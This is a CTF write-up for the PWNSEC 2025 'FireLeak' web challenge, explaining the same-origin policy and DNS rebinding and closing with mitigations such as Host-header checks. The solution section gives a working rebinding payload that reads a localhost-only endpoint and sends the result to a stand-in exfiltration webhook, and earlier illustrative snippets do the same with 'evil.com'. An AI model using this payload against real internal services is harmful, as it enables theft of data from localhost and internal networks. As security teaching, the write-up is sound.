# FireLeak - PWNSEC CTF 2025 Web Challenge Writeup

**Author:** 0x3en70rs  
**Category:** Web Security  
**Difficulty:** Medium  
**Attack Type:** DNS Rebinding

---

## Table of Contents
- [Introduction](#introduction)
- [Prerequisites](#prerequisites)
  - [Understanding Origin](#understanding-origin)
  - [Same Origin Policy (SOP)](#same-origin-policy-sop)
  - [DNS Rebinding Attack](#dns-rebinding-attack)
- [Challenge Overview](#challenge-overview)
- [Solution](#solution)
- [Mitigation](#mitigation)

---

## Introduction

Hello World,

The objective of this challenge is to apply a **DNS Rebinding Attack** to bypass the Same Origin Policy (SOP) and exfiltrate data from an internal endpoint. Before diving into how to solve this challenge, let's discuss some essential topics as prerequisites.

---

## Prerequisites

### Understanding Origin

Browsers define an **Origin** as a combination of three parts:
- **Scheme** (e.g., `http`, `https`)
- **Host** (e.g., `example.com`)
- **Port** (e.g., `80`, `443`)

When two URLs match all three components, they are considered to be of the **Same Origin**.

#### Example: Origin Comparison Logic

```javascript
function isSameOrigin(o1, o2) {
   const o1_parser = new URL(o1);
   const o2_parser = new URL(o2);
   const isSameHost = o1_parser.host == o2_parser.host;
   const isSameScheme = o1_parser.scheme == o2_parser.scheme;
   const isSamePort = o1_parser.port == o2_parser.port;
   return isSameScheme && isSameHost && isSamePort;
}
```

---

### Same Origin Policy (SOP)

The **Same Origin Policy** is a critical browser security mechanism that prevents one origin from accessing the content of another origin.

#### Attack Scenario

Consider malicious code written inside `http://evil.com`:

```javascript
// Malicious code on evil.com
fetch('http://bank.com/account')
  .then(response => response.text())
  .then(data => {
    // Try to steal sensitive data
    sendToAttacker(data);
  });
```

**What happens?**

The browser will **prevent** the JavaScript code inside `evil.com` from reading the content of `bank.com` because they are **different origins** (different hostnames).

#### Browser Behavior

```javascript
function canReadResponse(o1, o2) {
   if (isSameOrigin(o1, o2)) {
     readResponse(); 
   } else {
     throwSameOriginPolicyViolation();
   }
}
```

**Important Note:** Browsers compare hostnames, schemes, and ports — **NOT the IP addresses** resolved from DNS.

In our case, `http://evil.com` is not the same origin as `http://bank.com` (different host), so the SOP blocks the request.

**So how can we bypass this SOP guard?**

---

### DNS Rebinding Attack

> **Note:** DNS Rebinding doesn't typically target external domains like `bank.com`. Instead, it targets:
> - Internal IPs (`192.168.x.x`, `10.x.x.x`, `172.16.x.x`)
> - Localhost (`127.0.0.1`)
> - Cloud metadata endpoints
>
> The `bank.com` example is used for illustration purposes.

#### Understanding DNS TTL

**TTL (Time To Live)** is a DNS feature that determines how long a DNS resolver (including the browser's cache) should cache a record before checking for an update.

#### How DNS Rebinding Works

**Step 1: Initial State**

When `evil.com` initially loads:
1. Browser resolves `evil.com` → `1.2.3.4` (attacker's server)
2. Browser fetches HTML/JS from `1.2.3.4`
3. DNS record has low TTL (e.g., 60 seconds)

**Step 2: The Attack**

The malicious JavaScript contains:

```javascript
// Initial page load from evil.com (1.2.3.4)
setTimeout(() => {
  // After TTL expires, evil.com now resolves to 5.6.7.8 (target IP)
  fetch('http://evil.com/secret-data')
    .then(response => response.text())
    .then(data => {
      // Browser checks: is evil.com same origin as evil.com?
      // Answer: YES! (same hostname)
      // So we can read the response!
      exfiltrateData(data);
    });
}, VALUE_GREATER_THAN_TTL);
```

**The Key Insight:**
- Browser compares **hostnames**, not IPs
- `evil.com` (first request) vs `evil.com` (second request) = **Same Origin**
- Even though the IP changed from `1.2.3.4` to `5.6.7.8`!

---

## Challenge Overview

### The Flag Endpoint

The challenge has an endpoint that contains the flag:

```javascript
app.get('/flag', (req, res) => {
  res.send(FLAG);
});
```

### The Middleware Protection

However, there's middleware preventing external access:

```javascript
app.use((req, res, next) => {
  if (req.headers.origin) {
    return res.status(403).send('Access Denied');
  }
  if (req.ip !== '127.0.0.1' && req.ip !== '::1') {
    return res.status(403).send('Access Denied');
  }
  next();
});
```

**The Challenge:**
- We cannot access `/flag` directly (not from localhost)
- We don't have SSRF vulnerability
- We need to bypass SOP to read the flag content

**Solution:** Use DNS Rebinding Attack!

---

## Solution

### Step 1: Setup DNS Service

Set up a DNS service that:
1. Initially resolves to your HTML page (e.g., webhook server)
2. Has the lowest possible TTL (60 seconds)
3. Can be rebound to point to `127.0.0.1` after initial load

For this challenge, we'll use a webhook to host our malicious JavaScript.

**DNS Configuration:**
- Domain: `fireleak.0x3en70rs.com`
- Initial IP: Points to webhook server
- TTL: 60 seconds

### Step 2: Create the Webhook

Webhook URL:
```
https://fireleak.0x3en70rs.com/ef4ee3ff-88a9-40c3-9293-a63517b8556b
```

### Step 3: Craft the Malicious Payload

Create an HTML page with the following JavaScript:

```html
<!DOCTYPE html>
<html>
<head>
  <title>FireLeak Exploit</title>
</head>
<body>
  <script>
    function flag(endpoint) {
      fetch('http://fireleak.0x3en70rs.com/ef4ee3ff-88a9-40c3-9293-a63517b8556b' + endpoint)
        .then(response => response.text())
        .then(data => {
          // Exfiltrate the flag to our webhook
          fetch('https://your-exfil-webhook.com/?flag=' + encodeURIComponent(data));
        })
        .catch(err => console.error(err));
    }

    // Wait for DNS TTL to expire (60+ seconds)
    setTimeout(() => {
      flag('/flag');
    }, 65000); // 65 seconds
  </script>
  <h1>Loading...</h1>
</body>
</html>
```

### Step 4: Trigger the Bot

Submit the malicious URL to the bot:
```
http://fireleak.0x3en70rs.com/ef4ee3ff-88a9-40c3-9293-a63517b8556b
```

### Step 5: Rebind the DNS

When the bot hits the webhook (you'll see the request), immediately rebind the DNS:
- **Old IP:** Webhook server IP
- **New IP:** `127.0.0.1`

### Step 6: Exploit Flow

1. **Initial Request (t=0s):**
   - Bot resolves `fireleak.0x3en70rs.com` → Webhook IP
   - Bot fetches HTML page
   - JavaScript starts, `setTimeout` begins countdown

2. **DNS Rebinding (t=5s):**
   - Attacker changes DNS record: `fireleak.0x3en70rs.com` → `127.0.0.1`
   - TTL is 60 seconds

3. **Callback Execution (t=65s):**
   - `setTimeout` callback fires
   - Calls `flag('/flag')`
   - Fetches `http://fireleak.0x3en70rs.com/ef4ee3ff-88a9-40c3-9293-a63517b8556b/flag`

4. **DNS Resolution:**
   - Browser cache sees TTL expired
   - Makes new DNS query
   - Resolves to `127.0.0.1` (from bot's perspective)

5. **Bypass Middleware:**
   - Request comes from `127.0.0.1` ✓
   - Request has no `Origin` header (same-origin request) ✓
   - Middleware allows access!

6. **Read Response:**
   - Browser checks: `fireleak.0x3en70rs.com` vs `fireleak.0x3en70rs.com` → Same Origin ✓
   - JavaScript can read response content
   - Flag is exfiltrated to attacker's webhook

### Step 7: Capture the Flag

Check your exfiltration webhook to receive the flag! 🔥

```
PWNSEC{DNS_R3b1nd1ng_1s_D4ng3r0us!}
```

---

## Mitigation

To protect against DNS Rebinding attacks:

### 1. Always Check the Host Header

```javascript
app.use((req, res, next) => {
  const allowedHosts = ['localhost', '127.0.0.1', 'yourdomain.com'];
  if (!allowedHosts.includes(req.headers.host)) {
    return res.status(403).send('Invalid Host Header');
  }
  next();
});
```

### 2. Always Use HTTPS, Not HTTP

HTTPS prevents many DNS rebinding attacks because:
- Certificate validation fails when DNS is rebound
- Mixed content policies prevent attacks
- TLS pinning can be implemented

### 3. Additional Protections

- **Implement CORS policies properly**
- **Use authentication tokens** instead of relying on IP/Origin alone
- **Set DNS minimum TTL** on resolvers (though not always reliable)
- **Implement request signing** for sensitive endpoints
- **Use Content Security Policy (CSP)** headers

---

## Key Takeaways

1. **SOP compares hostnames, not IPs** - This is the fundamental weakness exploited
2. **DNS TTL matters** - Low TTL values enable rapid rebinding
3. **Defense in depth** - Don't rely on a single security mechanism
4. **Host header validation** - Critical for preventing rebinding attacks
5. **HTTPS is essential** - Provides multiple layers of protection

---

**Challenge Rating:** ⭐⭐⭐⭐☆

This challenge excellently demonstrates real-world DNS rebinding attacks and the importance of proper security controls when exposing internal services.

---

*Writeup by 0x3en70rs - PWNSEC CTF 2025*
